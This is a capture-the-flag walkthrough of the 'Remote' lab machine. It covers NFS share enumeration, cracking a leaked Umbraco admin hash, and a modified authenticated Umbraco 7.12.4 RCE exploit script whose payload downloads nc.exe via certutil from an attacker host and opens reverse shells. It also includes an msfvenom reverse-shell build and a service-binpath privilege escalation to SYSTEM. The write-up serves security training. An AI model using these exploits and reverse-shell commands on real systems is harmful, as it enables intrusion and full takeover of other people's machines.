# Remote

## IP: 10.10.10.180

```bash
$ nmap -vvv -sCV -oN remote.nmap 10.10.10.180
# Nmap 7.80 scan initiated Sun Apr 12 21:24:13 2020 as: nmap -vvv -sCV -oN remote.nmap 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up, received conn-refused (0.046s latency).
Scanned at 2020-04-12 21:24:13 CDT for 90s
Not shown: 993 closed ports
Reason: 993 conn-refused
PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
2049/tcp open  mountd        syn-ack 1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m16s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45222/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33476/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50705/udp): CLEAN (Timeout)
|   Check 4 (port 15893/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-13T02:28:23
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 12 21:25:43 2020 -- 1 IP address (1 host up) scanned in 90.64 seconds
```

The first thing that jumps out at me is anonymous FTP login allowed on port 21. No results with that.


Next thing that I check out is port 80. Go to `http://10.10.10.180` and see a website. Explore until you find the `http://10.10.10.180/contact/` page and click on the "Go to back office and install forms" to be redirected to `http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms` and see a login page. Viewing the source and googling around tells us that `Umbraco >= v7.6.4` is being used since versions `< 7.6.4` [leaked the version information in the HTML source](https://our.umbraco.com/forum/using-umbraco-and-getting-started/86203-umbraco-login-screen-leaking-version-details).

Let's do some basic user enumeration. From the `/people` page, we can scrape a list of people who probably have emails on this domain.

```
- Lee Kelleher
- Jeavon Leopold
- Jeroen Breuer
- Jan Skovgaard
- Matt Brailsford
```

Let's move on to something else for the moment. Port `2049` is running `mountd`. We can check if any share is available with the `showmount` command:

```bash
$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

$ mkdir /tmp/remote-nfs
$ sudo mount -t nfs 10.10.10.180:/site_backups /tmp/remote-nfs
$ cd /tmp/remote-nfs
```

After exploring for a little, we find the version number for Umbraco in `Web.config`: `7.12.4`. We can check `searchsploit` for any known exploits:

```bash
$ searchsploit umbraco 7.12.4
------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                          |  Path
                                                                        | (/usr/share/exploitdb/)
------------------------------------------------------------------------ ----------------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution              | exploits/aspx/webapps/46153.py
------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

This exploit requires us to be authenticated, so let's move on for now.


We also find the database version: `"Microsoft SQL Server Compact Data Provider 4.0"`

Additionally, in the `/App_Data/Logs/*`, we find these successful logins:

```bash
$ grep " Login attempt succeeded for" * | cut -d":" -f 6 | uniq
 Login attempt succeeded for username admin@htb.local from IP address 192.168.195.1
 Login attempt succeeded for username smith@htb.local from IP address 192.168.195.1
 Login attempt succeeded for username ssmith@htb.local from IP address 192.168.195.1
```

`admin`, `smith` and `ssmith` seem to be valid usernames on the box.


```bash
$ sdf +sdf2txt_ Umbraco.sdf
failed to redirect stdout: Permission deniedUmbraco.sdf warning, para. on 1: unknown phrase style 'G'
Umbraco.sdf warning, macro on 898: unknown macro ''
Umbraco.sdf warning, para. on 1568: unknown phrase style 'H'
Umbraco.sdf warning, para. on 1568: unknown phrase style 'G'
Umbraco.sdf warning, para. on 2619: unknown phrase style 'Q'
Umbraco.sdf warning, para. on 2889: unknown phrase style 'H'
VttyAdministratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d׃rfurfvrfrfXvadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50BiIfhVgvrfhVgXvadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
```

In this disgustingly formatted output, we can see a SHA1 hash: `adminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}`. We know the username `admin`, so the rest of the string could be the hashed password (`b8be16afba8c314ad33d812f22a04991b90e2aaa`). Shouldn't be too difficult to crack.

```bash
$ echo "admin:b8be16afba8c314ad33d812f22a04991b90e2aaa" > creds_to_crack.txt
$ john --wordlist=~/tools/wordlists/rockyou.txt --format=raw-sha1 creds_to_crack.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (admin)
1g 0:00:00:01 DONE (2020-04-13 05:51) 0.9900g/s 9726Kp/s 9726Kc/s 9726KC/s baconandcheese..bacon9092
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

Looks like the admin password is `baconandcheese`. Trying `admin@htb.local` and `baconandcheese` for username and password at the `Umbraco` login page from earlier works!

Let's revisit that authenticated exploit we found earlier.


```bash
$ searchsploit -m exploits/aspx/webapps/46153.py
$ mv 46153.py exploit-stage-1.py
```

Let's modify this exploit so we can use it. First, I update the target information block:

```python
login = "admin@local.htb";
password="baconandcheese";
host = "http://10.10.10.180";
```

Then I do some research on XML-embedded C# remote code execution attacks and find [this article](https://zerosum0x0.blogspot.com/2016/05/xml-attack-for-c-remote-code-execution.html). I modify the exploit to follow its style. After some trial and error, this payload lets me upload a compiled version of `nc.exe` to the remote machine:

```xml
# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A


import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());
    
print("Start");

payload = """<?xml version="1.0"?><xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="csharp_user">
public string xml()
{ string cmd = "/c certutil.exe -urlcache -split -f http://10.10.14.31/nc.exe c:/windows/temp/nc.exe";
System.Diagnostics.Process proc = new System.Diagnostics.Process();
 proc.StartInfo.FileName = "cmd.exe";
 proc.StartInfo.Arguments = cmd;
 proc.StartInfo.UseShellExecute = false;
 proc.StartInfo.RedirectStandardOutput = true;
 proc.Start();
 string output = proc.StandardOutput.ReadToEnd();
 return output;Console.WriteLine(output); } 
 </msxsl:script>
 <xsl:template match="/">
 <xsl:value-of select="csharp_user:xml()"/>
 </xsl:template>
 </xsl:stylesheet> """;

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);
soup = BeautifulSoup(r4.text, 'html.parser');
print(soup.find(id="result"))

print("End");
```

I'm taking advantage of the `certutil` download functionality detailed on [this LOLBAS entry](https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download). This lets us download a file from a server we host, with something like: 

```bash
$ sudo python3 -m http.server 80
```

We can run this exploit and see:

```bash
$ python3 exploit-stage-1.py
Start
[]
<div id="result"><?xml version="1.0" encoding="utf-16"?>****  Online  ****
  0000  ...
  96d8
CertUtil: -URLCache command completed successfully.
</div>
End
```

So, theoretically, we have `nc.exe` downloaded onto the target machine, located at `c:/windows/temp/nc.exe`.

Now, we need to modify this exploit to run it and spawn a reverse shell. All we need to change are the `proc.StartInfo.Arguments`, which are stored in the `cmd` variable. To use `nc.exe` to spawn a reverse shell on Windows, the command (in my case) is: `/c c:/windows/temp/nc.exe 10.10.14.31 1234 -e cmd.exe`, after starting a listener on port `1234`. This modification can be found in `exploits/exploit-stage-2.py`.

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.180] 50044
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> cd \Users\Public
c:\Users\Public>type user.txt
type user.txt
ff29cde*************************
```

And there's our user flag.

## Privilege Escalation

Let's generate a reverse shell using metasploit and format it as an `exe` file.

```bash
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.31 lport=1235 -f exe --platform windows > reverse.exe
```

Then move this over by modifying `exploit-stage-1.py` and using the same technique as before.

Then, we want to replace the `binpath` of a service that has two important properties with the path to our reverse shell executable. These two properties are:

1. I must have permissions to change its configuration.
2. It must have `NT AUTHORITY` security context.

```batch
C:\windows\system32> wmic service where started=true get name, startname
...
UsoSvc        NT AUTHORITY\LocalService
...

C:\windows\system32>sc stop UsoSvc
sc stop UsoSvc

SERVICE_NAME: UsoSvc
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530

C:\windows\system32>sc config usosvc binpath="C:\Windows\Temp\reverse.exe"
sc config usosvc binpath="C:\Windows\Temp\reverse.exe"
[SC] ChangeServiceConfig SUCCESS

C:\windows\system32>sc start usosvc
```

```batch
$ nc -lvnp 1235
listening on [any] 1235 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.180] 50072
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
c8255***************************
```
